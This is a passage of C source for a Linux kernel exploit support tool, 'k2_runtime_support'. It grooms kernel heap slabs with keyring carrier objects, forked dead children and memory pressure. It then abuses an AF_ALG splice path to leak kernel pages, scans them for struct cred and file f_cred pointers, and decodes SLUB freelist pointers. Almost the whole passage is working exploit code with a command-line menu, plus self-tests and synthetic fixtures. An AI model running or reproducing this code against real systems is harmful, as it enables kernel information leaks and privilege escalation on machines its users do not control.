               stage, current_attempt, rc, -rc);
    quarantine_destroy(&quarantine);
    if (rc == 0 && keep_payload_on_success && ring > 0) {
        kept_payload.ring = ring;
        kept_payload.count = SUPPORT_CARRIERS;
        memcpy(kept_payload.serials, serials, sizeof(kept_payload.serials));
        kept_payload.valid = true;
        printf("PAYLOAD_CAPTURE_KEEP ring=%d carriers=%zu cleanup_deferred=1"
               "\n", ring, kept_payload.count);
        ring = -1;
    }
    cleanup_ring(ring);
    if (enable_pressure)
        printf("PRESSURE_RELEASE retained_bytes=%" PRIu64 " pipes=%zu"
               " anonymous_mappings=%zu\n", pressure.retained_bytes,
               pressure.count, pressure.mapping_count);
    pressure_destroy(&pressure);
    return rc;
}

static int retire_file_generation(unsigned int count, bool report)
{
    int *fds;
    unsigned int opened = 0;
    int rc = 0;

    if (count < k2l.files_per_slab)
        return -EINVAL;
    fds = malloc((size_t)count * sizeof(*fds));
    if (!fds)
        return -ENOMEM;
    for (opened = 0; opened < count; opened++) {
        fds[opened] = open("/dev/null", O_RDONLY | O_CLOEXEC);
        if (fds[opened] < 0) {
            rc = -errno;
            break;
        }
    }
    for (unsigned int i = opened; i > 0; i--) {
        if (close(fds[i - 1]) < 0 && !rc)
            rc = -errno;
    }
    free(fds);
    if (rc)
        return rc;
    rc = global_rcu_gp();
    if (rc)
        return rc;
    sched_yield();
    usleep(20000);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    if (report)
        printf("CRED_FILE_RETIRE files=%u object_size=%u stride=%u"
               " f_cred_offset=%u objects_per_order0=%u"
               " phase=pre-splice-after-file-setup\n", count,
               (unsigned int)H_FILE_SIZE, (unsigned int)H_FILE_STRIDE,
               (unsigned int)H_FILE_CRED,
               (unsigned int)H_FILES_PER_ORDER0_SLAB);
    return 0;
}

struct cred_retire_context {
    unsigned int files;
    unsigned int calls;
};

static int cred_retire_pre_splice(void *argument)
{
    struct cred_retire_context *context = argument;
    int rc = retire_file_generation(context->files, context->calls == 0);

    if (!rc)
        context->calls++;
    return rc;
}

static int capture_current_cred(const char *output, unsigned int files,
                                unsigned int attempts, useconds_t delay,
                                bool enable_pressure, uint64_t reserve_bytes)
{
    struct page_quarantine quarantine;
    struct memory_pressure pressure;
    struct cred_retire_context retire;
    unsigned int sample_attempts[2] = {0};
    unsigned int sample_cpu_count;
    struct gap_plan plan;
    int setup_cpu, rc;

    if (files < k2l.files_per_slab)
        files = k2l.files_per_slab * 4U;
    retire = (struct cred_retire_context){.files = files};
    quarantine_init(&quarantine);
    setup_cpu = pin_to_last_cpu();
    if (setup_cpu < 0)
        return setup_cpu;
    pressure_init(&pressure, setup_cpu, reserve_bytes);
    if (enable_pressure)
        rc = apply_memory_pressure(&pressure);
    else {
        report_control_pressure(&pressure);
        rc = 0;
    }
    if (rc)
        goto out;
    if (enable_pressure)
        (void)pressure_release_pipe_tier(&pressure);
    rc = build_filp_cred_plan(&plan);
    if (rc)
        goto out;
    for (unsigned int i = 0; i < k2l.files_per_slab; i++) {
        size_t target = i * H_FILE_STRIDE + H_FILE_CRED;

        if (!plan_has_gap(&plan, target)) {
            rc = -ERANGE;
            goto out;
        }
    }
    sample_cpu_count = sysconf(_SC_NPROCESSORS_ONLN) > 1 ? 2 : 1;
    for (unsigned int attempt = 1; attempt <= attempts; attempt++) {
        unsigned char *record = NULL;
        unsigned int sample_cpu = (attempt - 1) % sample_cpu_count;
        unsigned int hits = 0;
        uint64_t cred = 0;
        size_t length = 0;

        rc = pin_current_thread((int)sample_cpu);
        if (rc)
            goto out;
        sample_attempts[sample_cpu]++;
        rc = quarantine_prepare(&quarantine, plan.expected_return);
        if (rc)
            goto out;
        afalg_pre_splice_hook = cred_retire_pre_splice;
        afalg_pre_splice_argument = &retire;
        rc = afalg_plan_record(&plan, delay, &record, &length);
        afalg_pre_splice_hook = NULL;
        afalg_pre_splice_argument = NULL;
        if (rc)
            goto out;
        if (length >= 4096)
            rc = scan_filp_cred(record, &cred, &hits);
        else
            rc = -EMSGSIZE;
        if (!rc) {
            rc = write_exact_file(output, record, 4096);
            free(record);
            if (rc)
                goto out;
            printf("CRED_CAPTURE_PASS cred=%#" PRIx64 " hits=%u"
                   " full_page=%s attempt=%u files=%u quarantine_pipes=%u"
                   " retained_bytes=%zu pressure_cpu=%d retire_batches=%u"
                   " cpu0_attempts=%u cpu1_attempts=%u output=%s\n", cred,
                   hits, hits == k2l.files_per_slab ? "yes" : "no", attempt,
                   files, quarantine.count, quarantine.retained_bytes,
                   setup_cpu, retire.calls, sample_attempts[0],
                   sample_attempts[1], output);
            goto out;
        }
        free(record);
        if (rc != -ENOENT)
            goto out;
    }
    rc = -ENOENT;
    printf("CRED_CAPTURE_GATE files=%u attempts=%u retire_batches=%u"
           " quarantine_pipes=%u retained_bytes=%zu pressure_cpu=%d"
           " cpu0_attempts=%u cpu1_attempts=%u"
           " gate=retired_file_page_not_self_identified\n", files, attempts,
           retire.calls, quarantine.count, quarantine.retained_bytes,
           setup_cpu, sample_attempts[0], sample_attempts[1]);
out:
    afalg_pre_splice_hook = NULL;
    afalg_pre_splice_argument = NULL;
    quarantine_destroy(&quarantine);
    if (enable_pressure)
        printf("PRESSURE_RELEASE retained_bytes=%" PRIu64 " pipes=%zu"
               " anonymous_mappings=%zu\n", pressure.retained_bytes,
               pressure.count, pressure.mapping_count);
    pressure_destroy(&pressure);
    return rc;
}

static int pin_to_last_cpu(void)
{
    cpu_set_t set;
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    int cpu = cpus > 1 ? 1 : 0;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set) < 0 ? -errno : cpu;
}

static int spray_dead_children(key_serial_t ring, unsigned int children)
{
    unsigned char fake[H_DIRECT_FAKE_BYTES];
    pid_t *pids;
    unsigned int i;
    int cpu, rc = 0;

    cpu = pin_to_last_cpu();
    if (cpu < 0)
        return cpu;
    make_support_fake(fake, 3);
    pids = calloc(children, sizeof(*pids));
    if (!pids)
        return -ENOMEM;
    for (i = 0; i < children; i++) {
        pids[i] = fork();
        if (pids[i] < 0) {
            rc = -errno;
            break;
        }
        if (pids[i] == 0) {
            int serial = create_carrier(ring, 0x1000 + i, fake);

            _exit(serial < 0 ? 1 : 0);
        }
    }
    for (unsigned int j = 0; j < i; j++) {
        int status;

        if (waitpid(pids[j], &status, 0) < 0 || !WIFEXITED(status) ||
            WEXITSTATUS(status) != 0)
            rc = rc ? rc : -ECHILD;
    }
    free(pids);
    if (rc)
        return rc;
    rc = global_rcu_gp();
    if (!rc) {
        sched_yield();
        usleep(1000);
        rc = global_rcu_gp();
    }
    printf("TASK_STACK_RETIRE children=%u pinned_cpu=%d stack_cache_slots=2\n",
           children, cpu);
    return rc;
}

static bool canonical_kernel_pointer(uint64_t value)
{
    return value >= UINT64_C(0xffff800000000000) &&
           value <= UINT64_C(0xffffffffffffffff) && (value & 7) == 0;
}

static int scan_task_gap(const unsigned char *record, size_t len,
                         size_t offset, uint64_t *cred)
{
    uint64_t first;

    if (len < offset + 15)
        return -EMSGSIZE;
    first = get_u64(record + offset);
    if (!canonical_kernel_pointer(first))
        return -ENOENT;
    if (memcmp(record + offset, record + offset + 8, 7) != 0)
        return -ENOENT;
    if ((first >> 56) != 0xff)
        return -ENOENT;
    *cred = first;
    return 0;
}

static int capture_task_cred(const char *output, unsigned int children,
                             unsigned int attempts, useconds_t delay)
{
    key_serial_t ring;
    int rc;

    ring = open_support_ring();
    if (ring < 0)
        return ring;
    rc = spray_dead_children(ring, children);
    if (rc)
        goto out;
    for (unsigned int attempt = 1; attempt <= attempts; attempt++) {
        size_t off = task_cred_page_offsets[(attempt - 1) %
                                            ARRAY_SIZE(task_cred_page_offsets)];
        unsigned char *record = NULL;
        size_t len = 0;
        uint64_t cred;

        rc = afalg_gap_record(off, 15, delay, &record, &len);
        if (rc)
            goto out;
        rc = scan_task_gap(record, len, off, &cred);
        if (!rc) {
            unsigned char page[4096];

            memset(page, 0xa5, sizeof(page));
            memcpy(page + off, record + off, 15);
            rc = write_exact_file(output, page, sizeof(page));
            free(record);
            if (rc)
                goto out;
            printf("TASK_CRED_CAPTURE_PASS attempt=%u offset=%zu cred=%#" PRIx64
                   " output=%s\n", attempt, off, cred, output);
            goto out;
        }
        free(record);
        if (rc != -ENOENT)
            goto out;
    }
    rc = -ENOENT;
    printf("TASK_CRED_CAPTURE_GATE attempts=%u"
           " gate=task_page_pattern_not_self_identified\n", attempts);
out:
    cleanup_ring(ring);
    return rc;
}

static int synthetic_payload_fixture(const char *record_path,
                                     const char *page_path)
{
    const uint64_t base = UINT64_C(0xffff9e8d4011b000);
    const uint64_t random = UINT64_C(0x6d3173f9ac842b10);
    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
    unsigned char record[4096], page[4096];
    struct freelist_solution solution;
    int rc;

    memset(record, 0xa5, sizeof(record));
    make_synthetic_freelist(base, random, enc);
    for (unsigned int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        put_u64(record + i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR,
                enc[i]);
    rc = reconstruct_payload_page(record, sizeof(record), page, &solution);
    if (rc || solution.base != base || solution.random != random)
        return rc ?: -ERANGE;
    rc = write_exact_file(record_path, record, sizeof(record));
    if (!rc)
        rc = write_exact_file(page_path, page, sizeof(page));
    if (!rc)
        printf("CALIBRATION_ONLY payload_record=%s reconstructed=%s\n",
               record_path, page_path);
    return rc;
}

static int synthetic_task_fixture(const char *path)
{
    unsigned char page[4096];
    const size_t off = task_cred_page_offsets[0];
    const uint64_t cred = UINT64_C(0xffff9e8d40112280);
    uint64_t found;
    int rc;

    memset(page, 0xa5, sizeof(page));
    put_u64(page + off, cred);
    put_u64(page + off + 8, cred);
    rc = scan_task_gap(page, sizeof(page), off, &found);
    if (rc || found != cred)
        return rc ?: -ERANGE;
    rc = write_exact_file(path, page, sizeof(page));
    if (!rc)
        printf("CALIBRATION_ONLY task_record=%s offset=%zu cred=%#" PRIx64
               "\n", path, off, cred);
    return rc;
}

static int quarantine_selftest(void)
{
    struct page_quarantine q;
    unsigned char input[4096], source[4096], retained[4096];
    int p[2] = {-1, -1};
    ssize_t n;
    int rc = 0;

    for (size_t i = 0; i < sizeof(input); i++)
        input[i] = (unsigned char)(i * 131u + 17u);
    quarantine_init(&q);
    rc = quarantine_prepare(&q, sizeof(input));
    if (rc)
        goto out;
    if (pipe2(p, O_CLOEXEC) < 0) {
        rc = -errno;
        goto out;
    }
    n = write(p[1], input, sizeof(input));
    if (n != sizeof(input)) {
        rc = n < 0 ? -errno : -EIO;
        goto out;
    }
    n = tee(p[0], afalg_quarantine_write_fd, sizeof(input), 0);
    if (n != sizeof(input)) {
        rc = n < 0 ? -errno : -EIO;
        goto out;
    }
    if (read(p[0], source, sizeof(source)) != sizeof(source) ||
        read(q.pipes[0][0], retained, sizeof(retained)) != sizeof(retained) ||
        memcmp(input, source, sizeof(input)) ||
        memcmp(input, retained, sizeof(input)))
        rc = -EIO;
out:
    if (p[0] >= 0)
        close(p[0]);
    if (p[1] >= 0)
        close(p[1]);
    quarantine_destroy(&q);
    return rc;
}

static int pressure_selftest(void)
{
    char meminfo[] = "MemTotal: 2097152 kB\nMemAvailable: 262144 kB\n";
    unsigned char observed[8192];
    struct memory_pressure pressure;
    uint64_t available = 0;
    long configured_page_size = sysconf(_SC_PAGESIZE);
    FILE *stream;
    size_t page_size;
    int rc;

    stream = fmemopen(meminfo, strlen(meminfo), "r");
    if (!stream)
        return -errno;
    rc = parse_mem_available(stream, &available);
    fclose(stream);
    if (rc || available != UINT64_C(256) * 1024 * 1024)
        return rc ?: -ERANGE;
    if (configured_page_size <= 0)
        return -EINVAL;
    page_size = (size_t)configured_page_size;
    pressure_init(&pressure, 0, 0);
    rc = pressure_fill_pipe(&pressure, page_size * 2, page_size);
    if (!rc && (pressure.count != 1 ||
                pressure.retained_bytes != page_size * 2))
        rc = -ERANGE;
    if (!rc && read(pressure.pipes[0].read_fd, observed, sizeof(observed)) !=
                   sizeof(observed))
        rc = -EIO;
    if (!rc && memcmp(observed, observed + page_size, page_size))
        rc = -ERANGE;
    pressure_destroy(&pressure);
    return rc;
}

static int public_control_selftest(void)
{
    unsigned char pattern[4096];
    unsigned char record[4096];
    const uint64_t cred = UINT64_C(0xffff9e8d40112280);
    uint64_t found = 0;
    unsigned int hits = 0;

    make_public_control_pattern(pattern, 7);
    memcpy(record, pattern, sizeof(record));
    if (count_public_control_windows(record, sizeof(record), pattern,
                                     H_USER_PAYLOAD_BUCKET,
                                     H_USER_PAYLOAD_FREEPTR,
                                     H_USER_PAYLOAD_OBJECTS_PER_SLAB) !=
        H_USER_PAYLOAD_OBJECTS_PER_SLAB)
        return -ERANGE;
    record[H_USER_PAYLOAD_FREEPTR] ^= 1;
    if (count_public_control_windows(record, sizeof(record), pattern,
                                     H_USER_PAYLOAD_BUCKET,
                                     H_USER_PAYLOAD_FREEPTR,
                                     H_USER_PAYLOAD_OBJECTS_PER_SLAB) !=
        H_USER_PAYLOAD_OBJECTS_PER_SLAB - 1)
        return -ERANGE;
    memcpy(record, pattern, sizeof(record));
    if (count_public_control_windows(record, sizeof(record), pattern,
                                     H_FILE_STRIDE, H_FILE_CRED,
                                     H_FILES_PER_ORDER0_SLAB) !=
        H_FILES_PER_ORDER0_SLAB)
        return -ERANGE;
    memset(record, 0, sizeof(record));
    for (unsigned int i = 0; i < 4; i++)
        put_u64(record + i * H_FILE_STRIDE + H_FILE_CRED, cred);
    if (scan_filp_cred(record, &found, &hits) || found != cred || hits != 4)
        return -ERANGE;
    put_u64(record + 3 * H_FILE_STRIDE + H_FILE_CRED, 0);
    if (scan_filp_cred(record, &found, &hits) != -ENOENT)
        return -ERANGE;
    return 0;
}

static int extended_selftest(void)
{
    char record[] = "/tmp/k2-payload-record-XXXXXX";
    char page[] = "/tmp/k2-payload-page-XXXXXX";
    char task[] = "/tmp/k2-task-page-XXXXXX";
    int fds[3], rc;

    if (selftest())
        return 1;
    fds[0] = mkstemp(record);
    fds[1] = mkstemp(page);
    fds[2] = mkstemp(task);
    if (fds[0] < 0 || fds[1] < 0 || fds[2] < 0)
        return 1;
    for (int i = 0; i < 3; i++)
        close(fds[i]);
    rc = synthetic_payload_fixture(record, page);
    if (!rc)
        rc = synthetic_task_fixture(task);
    if (!rc)
        rc = quarantine_selftest();
    if (!rc)
        rc = pressure_selftest();
    if (!rc)
        rc = public_control_selftest();
    unlink(record);
    unlink(page);
    unlink(task);
    if (rc)
        return 1;
    printf("RUNTIME_SUPPORT_SELFTEST_PASS quarantine=PASS pressure=PASS"
           " public_control=PASS cred_capture=PASS\n");
    return 0;
}

static void support_usage(FILE *stream)
{
    fprintf(stream,
        "usage:\n"
        "  k2_runtime_support --selftest\n"
        "  k2_runtime_support --capture-payload OUT [ATTEMPTS]\n"
        "  k2_runtime_support --capture-payload-pressure OUT [ATTEMPTS]"
        " [RESERVE_MIB]\n"
        "  k2_runtime_support --capture-payload-pressure-keep OUT"
        " [ATTEMPTS] [RESERVE_MIB]\n"
        "  k2_runtime_support --public-user-control OUT [ATTEMPTS]\n"
        "  k2_runtime_support --public-user-cred-control OUT [ATTEMPTS]\n"
        "  k2_runtime_support --public-helper-control OUT [ATTEMPTS]\n"
        "  k2_runtime_support --capture-cred OUT [FILES] [ATTEMPTS]\n"
        "  k2_runtime_support --capture-cred-pressure OUT [FILES] [ATTEMPTS]"
        " [RESERVE_MIB]\n"
        "  k2_runtime_support --capture-task OUT [CHILDREN] [ATTEMPTS]\n"
        "  k2_runtime_support --decode-record RECORD OUT\n"
        "  k2_runtime_support --scan-task-record RECORD\n"
        "  k2_runtime_support --trainer-payload RECORD OUT\n"
        "  k2_runtime_support --trainer-task OUT\n");
}

int main(int argc, char **argv)
{
    if (!k2l.key_user) {
        if (k2_layout_probe() != 0 || k2_layout_finish(0) != 0) {
            fprintf(stderr, "layout probe failed\n");
            return 2;
        }
    }
    if (argc == 2 && !strcmp(argv[1], "--selftest"))
        return extended_selftest();
    if ((argc == 3 || argc == 4) && !strcmp(argv[1], "--capture-payload")) {
        unsigned int attempts = argc == 4 ? strtoul(argv[3], NULL, 0) :
                                             DEFAULT_ATTEMPTS;
        int rc = capture_payload_slab(argv[2], attempts, 1000, false, 0);

        return rc ? 1 : 0;
    }
    if (argc >= 3 && argc <= 5 &&
        !strcmp(argv[1], "--capture-payload-pressure")) {
        unsigned long long reserve_mib = argc == 5 ?
            strtoull(argv[4], NULL, 0) : PRESSURE_DEFAULT_RESERVE_MIB;
        unsigned int attempts = argc >= 4 ? strtoul(argv[3], NULL, 0) :
                                             DEFAULT_ATTEMPTS;
        uint64_t reserve_bytes;
        int rc;

        if (reserve_mib > UINT64_MAX / (1024 * 1024)) {
            fprintf(stderr, "reserve MiB overflows byte count\n");
            return 2;
        }
        reserve_bytes = (uint64_t)reserve_mib * 1024 * 1024;
        rc = capture_payload_slab(argv[2], attempts, 1000, true, reserve_bytes);
        return rc ? 1 : 0;
    }
    if (argc >= 3 && argc <= 5 &&
        !strcmp(argv[1], "--capture-payload-pressure-keep")) {
        unsigned long long reserve_mib = argc == 5 ?
            strtoull(argv[4], NULL, 0) : PRESSURE_DEFAULT_RESERVE_MIB;
        unsigned int attempts = argc >= 4 ? strtoul(argv[3], NULL, 0) :
                                             DEFAULT_ATTEMPTS;
        uint64_t reserve_bytes;
        int rc;

        if (reserve_mib > UINT64_MAX / (1024 * 1024) || kept_payload.valid) {
            fprintf(stderr, "invalid reserve or retained capture exists\n");
            return 2;
        }
        reserve_bytes = (uint64_t)reserve_mib * 1024 * 1024;
        keep_payload_on_success = true;
        rc = capture_payload_slab(argv[2], attempts, 1000, true, reserve_bytes);
        keep_payload_on_success = false;
        return rc ? 1 : 0;
    }
    if ((argc == 3 || argc == 4) && !strcmp(argv[1], "--public-user-control")) {
        unsigned int attempts = argc == 4 ? strtoul(argv[3], NULL, 0) : 8;
        int rc = public_user_geometry_control(argv[2], attempts, 1000, false);

        return rc ? 1 : 0;
    }
    if ((argc == 3 || argc == 4) &&
        !strcmp(argv[1], "--public-user-cred-control")) {
        unsigned int attempts = argc == 4 ? strtoul(argv[3], NULL, 0) : 8;
        int rc = public_user_geometry_control(argv[2], attempts, 1000, true);

        return rc ? 1 : 0;
    }
    if ((argc == 3 || argc == 4) && !strcmp(argv[1], "--public-helper-control")) {
        unsigned int attempts = argc == 4 ? strtoul(argv[3], NULL, 0) :
                                             DEFAULT_ATTEMPTS;
        int rc = public_helper_control(argv[2], attempts, 1000, false);

        return rc ? 1 : 0;
    }
    if (argc >= 3 && argc <= 5 && !strcmp(argv[1], "--capture-cred")) {
        unsigned int files = argc >= 4 ? strtoul(argv[3], NULL, 0) :
                                          SUPPORT_FILES;
        unsigned int attempts = argc == 5 ? strtoul(argv[4], NULL, 0) :
                                             CRED_DEFAULT_ATTEMPTS;
        int rc = capture_current_cred(argv[2], files, attempts, 1000, false, 0);

        return rc ? 1 : 0;
    }
    if (argc >= 3 && argc <= 6 && !strcmp(argv[1], "--capture-cred-pressure")) {
        unsigned int files = argc >= 4 ? strtoul(argv[3], NULL, 0) :
                                          SUPPORT_FILES;
        unsigned int attempts = argc >= 5 ? strtoul(argv[4], NULL, 0) :
                                             CRED_DEFAULT_ATTEMPTS;
        unsigned long long reserve_mib = argc == 6 ?
            strtoull(argv[5], NULL, 0) : PRESSURE_DEFAULT_RESERVE_MIB;
        uint64_t reserve_bytes;
        int rc;

        if (reserve_mib > UINT64_MAX / (1024 * 1024)) {
            fprintf(stderr, "reserve MiB overflows byte count\n");
            return 2;
        }
        reserve_bytes = (uint64_t)reserve_mib * 1024 * 1024;
        rc = capture_current_cred(argv[2], files, attempts, 1000, true,
                                  reserve_bytes);
        return rc ? 1 : 0;
    }
    if (argc >= 3 && argc <= 5 && !strcmp(argv[1], "--capture-task")) {
        unsigned int children = argc >= 4 ? strtoul(argv[3], NULL, 0) :
                                             SUPPORT_CHILDREN;
        unsigned int attempts = argc == 5 ? strtoul(argv[4], NULL, 0) :
                                             DEFAULT_ATTEMPTS;
        int rc = capture_task_cred(argv[2], children, attempts, 1000);

        return rc ? 1 : 0;
    }
    if (argc == 4 && !strcmp(argv[1], "--decode-record")) {
        unsigned char record[4096], page[4096];
        struct freelist_solution solution;
        int rc = read_exact_file(argv[2], record, sizeof(record));

        if (!rc)
            rc = reconstruct_payload_page(record, sizeof(record), page,
                                          &solution);
        if (!rc)
            rc = write_exact_file(argv[3], page, sizeof(page));
        if (rc) {
            fprintf(stderr, "decode record: %s\n", strerror(-rc));
            return 1;
        }
        print_fake_candidates(&solution);
        return 0;
    }
    if (argc == 3 && !strcmp(argv[1], "--scan-task-record")) {
        unsigned char page[4096];
        int rc = read_exact_file(argv[2], page, sizeof(page));

        if (rc)
            return 1;
        for (size_t i = 0; i < ARRAY_SIZE(task_cred_page_offsets); i++) {
            uint64_t cred;

            rc = scan_task_gap(page, sizeof(page), task_cred_page_offsets[i],
                               &cred);
            if (!rc) {
                printf("TASK_CRED_PATTERN offset=%zu cred=%#" PRIx64 "\n",
                       task_cred_page_offsets[i], cred);
                return 0;
            }
        }
        return 1;
    }
    if (argc == 4 && !strcmp(argv[1], "--trainer-payload"))
        return synthetic_payload_fixture(argv[2], argv[3]) ? 1 : 0;
    if (argc == 3 && !strcmp(argv[1], "--trainer-task"))
        return synthetic_task_fixture(argv[2]) ? 1 : 0;
    support_usage(stderr);
    return 2;
}
